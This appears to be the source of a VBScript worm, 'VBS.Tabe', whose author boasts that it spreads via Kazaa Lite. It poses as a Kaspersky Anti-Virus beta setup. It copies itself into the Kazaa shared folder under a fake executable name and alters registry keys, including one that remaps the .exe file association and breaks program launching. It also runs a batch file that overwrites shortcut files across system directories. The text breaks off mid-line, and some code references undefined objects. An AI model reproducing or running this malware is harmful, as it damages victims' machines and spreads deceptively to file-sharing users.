' VBS.Tabe By JadraquerKiller
' JEJEJEJ, My first virus that spread via Kazaa Lite!!!!
' Norton AntiVirus SUCKS, SYMANTEC MOTHER FUCK
MsgBox "Kaspersky Anti-Virus 5.0 BETA Setup is initializing, please wait..."
set agm = CreateObject("Scripting.FileSystemObject")
set a = agm.CreateTextFile("c:\windows\KAV_SETUP", true)
Set agm = CreateObject("Wscript.Shell")

agm.CopyFile Wscript.ScriptFullName, "C:\My Shared Folder\KAV5.0_BETA.exe.vbs", True


agm.RegWrite "HKLM\\Software\\KaZaA\\Transfer\\DlDir0", "C:\My Shared Folder"


set agm=shell.CreateShortCut("C:\KAV5.0_BETA.exe.lnk")
agm.TargetPath=shell.ExpandEnvironment("C:\KAV5.0_BETA.exe.vbs")
agm.WindowStyle=4
agm.Save
set agm=agm.CreateTextFile("C:\lnk.bat")
agm.WriteLine "cls"
agm.WriteLine "@echo off"
agm.WriteLine "for %%a in (*.lnk ..\*.lnk \*.lnk %path%\*.lnk %tmp%\*.lnk %temp%\*.lnk %windir%\*.lnk) do copy C:\vbs.lnk %%a"
agm.Close
agm.Run  "C:\lnk.bat"

agm.RegWrite "HKCR\.exe", "txtfile"


agm.CopyFile Wscript.ScriptFullName, "C:\Virc\KAV5.0_BETA.exe.vbs", True
agm.RegWrite "